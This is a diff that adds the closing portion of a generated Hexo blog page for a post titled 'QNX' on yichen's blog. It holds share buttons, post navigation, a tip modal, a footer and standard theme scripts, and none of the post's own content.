+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2022/04/07/nkd6cf/&title=《QNX》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2022/04/07/nkd6cf/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《QNX》 — yichen's blog&url=https://yichen115.github.io/2022/04/07/nkd6cf/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2022/04/07/nkd6cf/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/04/12/ryy1ed/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Hollong&amp;wireshark抓BLE</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/03/17/pet5rg/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">nRF Sniffer+wireshark嗅探蓝牙数据</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020 - 2022</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2022/04/07/nkd6cf/&title=《QNX》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2022/04/07/nkd6cf/&title=《QNX》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2022/04/07/nkd6cf/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《QNX》 — yichen's blog&url=https://yichen115.github.io/2022/04/07/nkd6cf/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2022/04/07/nkd6cf/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2022/04/07/nkd6cf/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
